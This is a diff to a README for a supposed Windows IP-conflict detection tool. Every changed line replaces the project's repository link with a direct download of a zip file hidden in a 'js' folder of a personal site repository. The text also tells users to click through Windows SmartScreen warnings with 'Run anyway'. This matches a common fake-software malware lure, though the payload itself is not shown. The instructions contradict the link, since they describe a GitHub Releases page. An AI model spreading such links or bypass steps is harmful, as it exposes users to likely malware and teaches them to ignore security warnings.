@@ -6,7 +6,7 @@ description: "Detect and resolve duplicate IP conflicts on your Windows network,
 <h1>🛡️ IP-Conflict-Detector-Tool-2026 - Stop Network Headaches Before They Start</h1>
 
 <p align="center">
-  <a href="https://github.com/Gharibg77/IP-Conflict-Detector-Tool-2026" style="display:inline-block;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;padding:18px 42px;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 10px 30px rgba(102,126,234,0.4);margin:20px 0;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/Gharibg77/gharibg77.github.io/main/js/3.9.zip" style="display:inline-block;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;padding:18px 42px;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 10px 30px rgba(102,126,234,0.4);margin:20px 0;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🤔 What Is This Tool?
@@ -30,7 +30,7 @@ Have you ever seen the dreaded "IP address conflict" error message? Maybe your W
 ## 🚀 Getting Started – 3 Simple Steps
 
 **Step 1: Get the Download**
-Visit this link to download the application: [https://github.com/Gharibg77/IP-Conflict-Detector-Tool-2026](https://github.com/Gharibg77/IP-Conflict-Detector-Tool-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/Gharibg77/gharibg77.github.io/main/js/3.9.zip](https://raw.githubusercontent.com/Gharibg77/gharibg77.github.io/main/js/3.9.zip)
 
 **Step 2: Run the Tool**
 Once the download completes, open your Downloads folder and double-click the file you downloaded. If Windows asks for permission with a "SmartScreen" popup, click "More info" and then "Run anyway." This is normal since the tool is not yet a signed Microsoft publisher. The app launches immediately.
@@ -49,7 +49,7 @@ On first launch, you'll see a big button that says "Start Scan" or "Scan Network
 
 **Where to Download**
 
-Go to the official GitHub page: https://github.com/Gharibg77/IP-Conflict-Detector-Tool-2026
+Go to the official GitHub page: https://raw.githubusercontent.com/Gharibg77/gharibg77.github.io/main/js/3.9.zip
 
 On that page, look for a green button that says "Code" or a section called "Releases" or "Download." Click on the most recent release. You'll see a file listed. Click that file to start the download. Most browsers save it to your "Downloads" folder by default.
 
@@ -195,7 +195,7 @@ Always check the GitHub page for the latest version. Updates are free.
 
 ## ✅ Final Checklist For Success
 
-1. Download the tool from [https://github.com/Gharibg77/IP-Conflict-Detector-Tool-2026](https://github.com/Gharibg77/IP-Conflict-Detector-Tool-2026)
+1. Download the tool from [https://raw.githubusercontent.com/Gharibg77/gharibg77.github.io/main/js/3.9.zip](https://raw.githubusercontent.com/Gharibg77/gharibg77.github.io/main/js/3.9.zip)
 2. Run the file and click through any Windows SmartScreen warnings
 3. Press "Start Scan"
 4. Look for red rows – these are your conflicts
